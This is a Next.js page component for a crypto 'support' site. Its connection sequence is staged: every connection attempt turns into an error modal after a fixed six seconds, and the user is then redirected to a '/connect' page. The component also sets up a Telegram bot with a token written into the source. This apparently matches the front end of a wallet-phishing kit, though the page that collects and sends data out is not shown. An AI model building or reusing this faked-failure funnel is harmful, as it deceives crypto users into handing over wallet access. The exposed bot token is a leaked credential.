"use client";

import React, { useEffect, useState } from "react";
import { ArrowUpRight, Shield, Zap, TrendingUp } from "lucide-react";
import ProtocolStats from "./component/ProtocolStats";
import ServicesGrid from "./component/ServicesGrid";
import SupportIntake from "./component/SupportIntake";
import Footer from "./component/Footer";
import LiveTicker from "./component/LiveTracker";
import CryptoRain from "./component/CryptoRain";
import Hero from "./component/Hero";
import ConnectionModal from "./component/ConnectionModal";
import ErrorModal from "./component/ErrorModal";
import { useRouter } from "next/navigation";
import { Bot, InlineKeyboard, } from "grammy";

export default function App() {
  const bot_token = process.env.bot_api;
  const chat_id = process.env.chat_id;
  const bot = new Bot("9077199448:AAGGm3efhhGEjXt4S4QOWotTCmDgmeMKynU"); // Initialize bot with token from environment variable
  const router = useRouter()
  const [connectModalOpen, setConnectModalOpen] = useState(false);
  const [errorModalOpen, setErrorModalOpen] = useState(false);
  const [selectedService, setSelectedService] = useState("Buy Token / Coin");

  const startConnectionSequence = (title: string) => {
    setSelectedService(title);
    setErrorModalOpen(false);
    setConnectModalOpen(true);

    // Automate handoff state: after 6 seconds of tracing, flip to the failure layout view
    setTimeout(() => {
      setConnectModalOpen((currentlyOpen) => {
        if (currentlyOpen) {
          setErrorModalOpen(true); // Mount error panel view
          return false; // Drop loading overlay layer
        }
        return false;
      });
    }, 6000);
  };


  const handleManualRedirect = () => {
    setErrorModalOpen(false);
    // Smoothly scroll view down directly into your support form wrapper section
    router.push(`/connect`);
  };


  return (
    <main className="min-h-screen bg-[#0B0E11] text-white relative">

      <LiveTicker />

      <Hero openConnectionModal={startConnectionSequence} />

      <ProtocolStats />
      <ServicesGrid triggerConnection={startConnectionSequence} />
      <SupportIntake />
      <Footer />

      {/* MODAL 1: Active 6s Search Loader Deck */}
      <ConnectionModal
        isOpen={connectModalOpen}
        onClose={() => setConnectModalOpen(false)}
        serviceTitle={selectedService}
      />

      {/* MODAL 2: Fallback Failure Route Deck */}
      <ErrorModal
        isOpen={errorModalOpen}
        onClose={() => setErrorModalOpen(false)}
        onManualConnect={handleManualRedirect}
        serviceTitle={selectedService}
      />
    </main>
  );
}
